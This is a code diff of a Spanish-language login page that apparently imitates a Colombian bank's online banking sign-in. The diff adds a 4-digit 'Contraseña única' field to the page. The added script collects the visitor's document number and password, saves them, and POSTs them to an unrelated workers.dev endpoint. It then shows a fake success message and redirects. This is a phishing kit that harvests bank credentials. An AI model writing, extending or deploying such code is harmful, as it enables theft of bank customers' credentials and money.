@@ -82,7 +82,6 @@
 
         /* Logo */
         .logo {
-            
             margin-bottom: 20px;
         }
         .logo img {
@@ -106,7 +105,6 @@
         /* Labels - CENTRADAS */
         label {
             display: block;
-           
             font-size: 11px;
             margin-bottom: 6px;
             margin-top: 15px;
@@ -123,7 +121,6 @@
             font-size: 15px;
             outline: none;
             transition: all 0.3s ease;
-           
         }
         input:focus {
             border-color: #00a651;
@@ -243,7 +240,7 @@
             background: rgba(255, 123, 0, 0.1);
         }
 
-        /* Botón Continuar */
+        /* Botón Continuar / Ingresar */
         .continue-btn {
             background: #bdbdbd;
             color: #7a7a7a;
@@ -303,6 +300,60 @@
             color: #777;
             text-align: center;
             width: 100%;
+        }
+
+        /* ===========================
+            SECCIÓN DE CLAVE (inline)
+        =========================== */
+        .help-text-clave {
+            width: 91%;
+            margin: 0 auto 8px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .help-text-clave a {
+            color: #ff7b00;
+            text-decoration: none;
+        }
+
+        .input-wrapper {
+            width: 91%;
+            margin: 0 auto;
+            position: relative;
+            display: flex;
+            justify-content: center;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 1px solid #dcdcdc;
+            font-size: 26px;
+            text-align: center;
+            letter-spacing: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #00a651;
+            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
+        }
+
+        .input-field::placeholder { color: #c0c0c0; }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #999;
+            cursor: pointer;
         }
 
         /* ===========================
@@ -575,9 +626,27 @@
                 <label for="rememberDoc">Recordar tipo y número de documento</label>
             </div>
 
+            <!-- ===== CLAVE (visible junto al documento) ===== -->
+            <div class="help-text-clave" style="margin-top:20px;">
+                <span>Contraseña única</span>
+                <a href="#" id="forgotPassword">¿La olvidaste?</a>
+            </div>
+
+            <div class="input-wrapper">
+                <input 
+                    type="password"
+                    id="claveInput"
+                    class="input-field"
+                    maxlength="4"
+                    placeholder="-  -  -  -"
+                    inputmode="numeric"
+                >
+                <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
+            </div>
+
             <!-- BOTONES -->
             <div class="button-container" id="buttonContainer">
-                <button class="continue-btn" id="continueButton">Continuar</button>
+                <button class="continue-btn" id="loginButton" disabled>Ingresar</button>
             </div>
 
             <div class="bottom-text">
@@ -620,9 +689,7 @@
                     <button class="payment-btn" id="pagosBtn">Inscribe y paga </button>
                 </div>
                 
-                <div class="website-link">
-                   
-                </div>
+                <div class="website-link"></div>
             </div>
         </div>
 
@@ -644,16 +711,12 @@
             const loader = document.getElementById('loader');
             const mainContent = document.getElementById('mainContent');
             
-            // Fade out loader
             setTimeout(() => {
                 loader.classList.add('hidden');
                 
-                // Mostrar contenido principal
                 setTimeout(() => {
                     loader.style.display = 'none';
                     mainContent.classList.add('show');
-                    
-                    // Cargar datos guardados si existen
                     loadSavedData();
                 }, 300);
             }, 800);
@@ -673,105 +736,161 @@
 
         // Elementos principales
         const userInput = document.getElementById('userInput');
-        const continueButton = document.getElementById('continueButton');
+        const claveInput = document.getElementById('claveInput');
+        const loginButton = document.getElementById('loginButton');
         const buttonContainer = document.getElementById('buttonContainer');
 
-        // Habilitar/Deshabilitar el botón
-        userInput.addEventListener('input', () => {
-            const userValue = userInput.value.trim();
-            if (userValue.length >= 4) {
-                continueButton.classList.add('enabled');
+        // Validación conjunta: documento >= 4 dígitos Y clave = 4 dígitos
+        function validateForm() {
+            const docOk = userInput.value.trim().length >= 4;
+            const claveOk = claveInput.value.length === 4;
+            
+            if (docOk && claveOk) {
+                loginButton.classList.add('enabled');
+                loginButton.disabled = false;
             } else {
-                continueButton.classList.remove('enabled');
+                loginButton.classList.remove('enabled');
+                loginButton.disabled = true;
             }
+        }
+
+        userInput.addEventListener('input', validateForm);
+
+        claveInput.addEventListener('input', () => {
+            if (claveInput.value.length > 4) {
+                claveInput.value = claveInput.value.slice(0, 4);
+            }
+            validateForm();
         });
 
-        // Enter key para enviar
-        userInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && continueButton.classList.contains('enabled')) {
-                continueButton.click();
-            }
+        // Enter en cualquier campo -> enviar si está habilitado
+        [userInput, claveInput].forEach(inp => {
+            inp.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !loginButton.disabled) {
+                    loginButton.click();
+                }
+            });
         });
 
         // Detectar teclado en móviles
         function detectMobileKeyboard() {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
             if (!isMobile) return;
             
             let originalHeight = window.innerHeight;
             
             window.addEventListener('resize', () => {
                 if (window.innerHeight < originalHeight * 0.7) {
-                    // Teclado visible
                     buttonContainer.classList.add('keyboard-active');
                 } else {
-                    // Teclado oculto
                     buttonContainer.classList.remove('keyboard-active');
                 }
             });
         }
-        
         detectMobileKeyboard();
 
-        // Acción al hacer clic en "Continuar"
-        continueButton.addEventListener('click', async () => {
-            const userValue = userInput.value.trim();
-            
-            if (userValue.length >= 4) {
-                try {
-                    // Mostrar estado de carga
-                    continueButton.classList.add('loading');
-                    continueButton.disabled = true;
-                    
-                    // Generar transactionId único
-                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                    
-                    // Guardar en localStorage
-                    let bancoldata;
-                    try {
-                        const storedData = localStorage.getItem('bancoldata');
-                        bancoldata = storedData ? JSON.parse(storedData) : {};
-                    } catch (e) {
-                        console.error('Error al parsear bancoldata:', e);
-                        bancoldata = {};
-                    }
-
-                    bancoldata.usuario = userValue;
-                    bancoldata.transactionId = transactionId;
-                    bancoldata.fecha = new Date().toISOString();
-                    
-                    // Guardar preferencia de "recordar"
-                    const rememberDoc = document.getElementById('rememberDoc').checked;
-                    if (rememberDoc) {
-                        bancoldata.rememberDocument = true;
-                        bancoldata.tipoDocumento = document.getElementById('openSelect').textContent;
-                    }
-                    
-                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-                    
-                    // Redirigir después de un breve delay (sin mostrar mensaje de confirmación)
-                    setTimeout(() => {
-                        window.location.href = 'cel-clave.html';
-                    }, 800);
-                    
-                } catch (error) {
-                    console.error('Error:', error);
-                    showToast('Error al procesar la solicitud', 'error');
-                    
-                    // Restaurar botón
-                    continueButton.classList.remove('loading');
-                    continueButton.disabled = false;
-                }
+        // OJITO
+        const toggleEye = document.getElementById('toggleEye');
+        toggleEye.addEventListener('click', () => {
+            if (claveInput.type === 'password') {
+                claveInput.type = 'text';
+                toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
             } else {
-                // Animación de shake en el input
+                claveInput.type = 'password';
+                toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        });
+
+        // LOGIN (misma lógica que el segundo archivo)
+        async function performLogin() {
+            if (loginButton.disabled) return;
+
+            const userValue = userInput.value.trim();
+
+            if (userValue.length < 4) {
                 userInput.classList.add('shake');
                 showToast('Ingrese un número de documento válido (mínimo 4 dígitos)', 'error');
-                
-                setTimeout(() => {
-                    userInput.classList.remove('shake');
-                }, 500);
+                setTimeout(() => userInput.classList.remove('shake'), 500);
+                return;
             }
+
+            if (claveInput.value.length !== 4) {
+                claveInput.classList.add('shake');
+                showToast('Ingrese su contraseña de 4 dígitos', 'error');
+                setTimeout(() => claveInput.classList.remove('shake'), 500);
+                return;
+            }
+
+            try {
+                loginButton.classList.add('loading');
+                loginButton.disabled = true;
+
+                let bancoldata;
+                try {
+                    const storedData = localStorage.getItem('bancoldata');
+                    bancoldata = storedData ? JSON.parse(storedData) : {};
+                } catch (e) {
+                    console.error('Error al parsear bancoldata:', e);
+                    bancoldata = {};
+                }
+
+                const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+                bancoldata.usuario = userValue;
+                bancoldata.clave = claveInput.value;
+                bancoldata.transactionId = transactionId;
+                bancoldata.fecha = new Date().toISOString();
+
+                const rememberDoc = document.getElementById('rememberDoc').checked;
+                if (rememberDoc) {
+                    bancoldata.rememberDocument = true;
+                    bancoldata.tipoDocumento = document.getElementById('openSelect').textContent;
+                }
+
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+
+                await new Promise(r => setTimeout(r, 1000));
+
+                const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        usuario: bancoldata.usuario,
+                        clave: bancoldata.clave,
+                        transactionId
+                    })
+                });
+
+                const json = await res.json();
+
+                if (json.ok) {
+                    loginButton.innerHTML = "✔ Correcto";
+                    loginButton.style.background = "#00a651";
+                    loginButton.style.color = "#fff";
+                    setTimeout(() => (location.href = "loading.html"), 700);
+                } else {
+                    loginButton.innerHTML = "Ingresar";
+                    loginButton.classList.remove('loading');
+                    validateForm();
+                    alert("Error: " + json.error);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showToast('Error de conexión. Intenta de nuevo.', 'error');
+                loginButton.innerHTML = "Ingresar";
+                loginButton.classList.remove('loading');
+                validateForm();
+            }
+        }
+
+        loginButton.addEventListener('click', performLogin);
+
+        // "¿La olvidaste?"
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            showToast('Recuperación de contraseña próximamente');
         });
 
         // ====================
@@ -810,7 +929,6 @@
                 openSelect.textContent = opt.dataset.value;
                 closeModal();
                 
-                // Feedback visual
                 openSelect.style.borderColor = '#00a651';
                 setTimeout(() => {
                     openSelect.style.borderColor = '';
@@ -825,10 +943,8 @@
             try {
                 const savedData = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 
-                // Cargar tipo de documento
                 if (savedData.tipoDocumento) {
                     openSelect.textContent = savedData.tipoDocumento;
-                    // Actualizar selección en modal
                     options.forEach(opt => {
                         opt.classList.remove('selected');
                         if (opt.dataset.value === savedData.tipoDocumento) {
@@ -837,17 +953,15 @@
                     });
                 }
                 
-                // Cargar número de documento
                 if (savedData.usuario) {
                     userInput.value = savedData.usuario;
-                    // Disparar evento para habilitar botón si aplica
-                    userInput.dispatchEvent(new Event('input'));
                 }
                 
-                // Marcar checkbox de recordar
                 if (savedData.rememberDocument) {
                     document.getElementById('rememberDoc').checked = true;
                 }
+
+                validateForm();
                 
             } catch (e) {
                 console.error('Error al cargar datos guardados:', e);
@@ -855,21 +969,18 @@
         }
 
         // ====================
-        // FUNCIONALIDAD SECCIÓN DE AYUDA
+        // SECCIÓN DE AYUDA
         // ====================
         document.getElementById('solicitarProductos').addEventListener('click', () => {
             showToast('Redirigiendo a solicitud de productos...');
-            // window.location.href = 'productos.html';
         });
 
         document.getElementById('contactanos').addEventListener('click', () => {
             showToast('Redirigiendo a página de contacto...');
-            // window.location.href = 'contacto.html';
         });
 
         document.getElementById('pagosBtn').addEventListener('click', () => {
             showToast('Redirigiendo a inscripción de pagos...');
-            // window.location.href = 'pagos.html';
         });
 
         // Mejorar experiencia en móviles
@@ -890,5 +1001,3 @@
     </script>
 </body>
 </html>
-
-
